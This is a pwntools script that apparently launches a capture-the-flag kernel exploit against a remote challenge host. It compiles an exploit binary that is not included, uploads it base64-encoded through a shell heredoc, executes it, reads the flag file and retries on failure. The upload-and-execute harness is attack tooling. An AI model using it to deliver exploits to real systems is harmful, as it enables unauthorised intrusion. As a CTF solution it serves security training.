from pwn import *
import os
import base64

aslr = True
context.log_level = "debug"
context.terminal = ['tmux','splitw','-h']
context.arch = "amd64"
context.os = "linux"

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = None
ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def send_file(src, dst):
    pl = base64.b64encode(open(src, "rb").read())
    sla(b"#", b"cat<<EOF|base64 -d>"+dst)
    for i in range(0, len(pl), 0x100):
        sla(b">", pl[i:i+0x100])
    sla(b">", b"EOF")

def conn(local=1):
    global p
    if local:
        os.system("cd rootfs && find . | cpio -o --format=newc > ../initramfs.cpio.gz && cd --")
        pc = './run'
        p = process(pc,aslr=aslr)
        sla(b"~ #", b"chmod +x /exp; /exp")

    else:
        #remote_addr = ['127.0.0.1', 5000]
        remote_addr = ['dicec.tf', 32079]
        p = remote(remote_addr[0], remote_addr[1])

        send_file("kfunc/kfunc.ko", b"/kfunc.ko")
        send_file("rootfs/exp", b"/exp")
        sla(b"~ #", b"chmod +x /exp; /exp")


if __name__ == "__main__":
    #os.system("gcc -g --debug -static -o ./rootfs/exp ./bassoon_qemu.exp.c")
    os.system("gcc -O3 -static -o ./rootfs/exp ./bassoon_qemu.exp.c")

    while True:
        try:
            conn(0)
            sla("sh", "cat flag.txt")
            break
        except EOFError:
            p.close()
            continue

    p.interactive()


